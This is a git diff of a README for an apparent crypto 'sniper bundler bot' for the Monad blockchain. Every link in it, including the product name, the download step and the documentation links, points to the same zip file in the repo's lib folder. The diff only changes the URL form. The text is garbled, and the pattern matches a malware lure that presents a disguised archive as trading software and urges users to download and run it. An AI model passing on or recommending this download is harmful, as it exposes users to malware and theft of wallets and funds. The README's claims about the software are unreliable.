@@ -1,16 +1,16 @@
-# 🤖 https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip - Trade Smarter with Our Bot
+# 🤖 https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip - Trade Smarter with Our Bot
 
-[![Download Here](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
+[![Download Here](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip%20Now-Click%20Here-brightgreen)](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip! This software helps you trade effectively on the https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip and Monad blockchain. It allows you to snipe new tokens quickly and manage multiple wallets with ease.
+Welcome to the https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip! This software helps you trade effectively on the https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip and Monad blockchain. It allows you to snipe new tokens quickly and manage multiple wallets with ease.
 
 ## 📦 Download & Install
 
 To start using our trading bot, please follow these steps:
 
-1. Visit this page to download: [https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Releases](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip).
+1. Visit this page to download: [https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Releases](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip).
 2. Choose the latest version from the list.
 3. Download the file suited for your operating system.
 4. Locate the downloaded file on your computer.
@@ -53,8 +53,8 @@ Your contributions are welcome! If you want to add features or improve the bot, 
 
 For further learning, here are some resources to get you started:
 
-- [https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Documentation](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
-- [Monad Blockchain Overview](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
-- [Trading Basics](https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
+- [https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Documentation](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
+- [Monad Blockchain Overview](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
+- [Trading Basics](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip)
 
-Thank you for choosing the https://raw.githubusercontent.com/zlock1231/monad-nad.fun-sniper-bundler-bot/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Happy trading!
+Thank you for choosing the https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/raw/refs/heads/main/lib/monad-nad.fun-sniper-bundler-bot-hebdomary.zip Happy trading!
